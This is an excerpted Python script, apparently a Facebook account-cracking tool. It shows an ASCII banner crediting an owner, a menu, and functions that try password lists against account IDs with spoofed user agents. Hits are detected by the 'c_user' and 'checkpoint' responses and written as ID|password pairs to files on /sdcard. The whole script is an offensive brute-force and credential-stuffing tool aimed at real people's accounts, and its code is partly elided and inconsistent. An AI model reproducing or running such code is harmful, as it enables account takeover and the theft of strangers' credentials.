...
for x in range(10):
	...
	i='; U; JIDa/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
...
\033[1;36m$$ |  $$ |  $$ |  $$ |  $$ |$$ |  $$ |$$ |  $$ |
\033[1;37m\$$$$$$  |$$$$$$\ $$ |  $$ |$$ |  $$ |$$$$$$$  |
\033[1;38m \______/ \______|\__|  \__|\__|  \__|\_______/ 
\033[1;32m════════════════════════════════════════════
\033[1;32m[+]     Owner    : JID-JIHAD᭄➼
\033[1;32m[+]     Facebook : REFRRSH JIHAD᭄➼
\033[1;32m[+]     Version  : 1.0
\033[1;32m[+]     Git hup  :J1H4D-2-0 ᭄➼
...
def fia():    
			print(logo)
			print('\x1b[97;1m[✓] ꧁JID᭄➼  VERSION :\x1b[1;92m 1.0 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://facebook.com/Jihadvai009');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁JID᭄➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[꧁JID᭄➼-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/JID-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[꧁JID᭄➼-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/JID-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁JID᭄➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[꧁JID᭄➼-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[꧁JID᭄➼-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/JID-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m꧁JID᭄➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[꧁JID᭄➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[꧁JID᭄➼-OK] '+uid+' | '+ps+'\33[0;97m')
